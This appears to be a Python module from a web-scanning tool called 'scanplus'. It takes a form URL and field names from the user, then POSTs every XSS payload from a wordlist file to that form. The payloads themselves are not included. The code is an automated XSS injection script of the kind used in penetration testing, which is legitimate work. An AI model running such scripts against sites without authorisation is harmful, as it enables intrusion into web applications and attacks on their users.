import requests
from .some_function import *
import os



def test_xssi_payload(url, payloads, submit):
    userPass = os.getcwd() + "/core/wordlist/xss_i.txt"
    with open(userPass, "r") as up:
        liste = up.readlines()
        k = 0
        for l in liste:
            data = l.split("\n")[0]
            payload = data
            headers = {'User-Agent': 'Mozilla/5.0'}
            payload = {payloads: payload, submit: "Ok"}
            link = url
            session = requests.Session()
            try:
                resp = session.get(link, headers=headers)
            except Exception as e:
                print(e)
            cookies = requests.utils.cookiejar_from_dict(requests.utils.dict_from_cookiejar(session.cookies))
            print(cookies)
            try:
                resp = session.post(link, headers=headers, data=payload, cookies=cookies)
            except Exception as e:
                print(e)
            print(resp.headers)
            if resp.status_code == 200:
                k = k + 1
                print_yellow_bold("Payload-{} : {} =====>>>>> ok test".format(k, payload))
            else:
                print_green("Check your connection settings")
                break
    print_blue("\nGo to see on your website {} if one playload at been execute\n".format(url))








def XSS_i():
    print_blue("\n\n===============================================================================================")
    print_blue("You have choisen XSS injection Attack")

    print("\nEnter your url form ex: https://example.com/login")
    url = input("scanplus> url >> ")

    print("\nEnter the name of form parameter. ex: user")
    payloads = input("scanplus> username >> ")

    print("\nEnter the name of your submit parameter. ex: submit")
    submit = input("scanplus> submit >> ")


    test_xssi_payload(url, payloads, submit)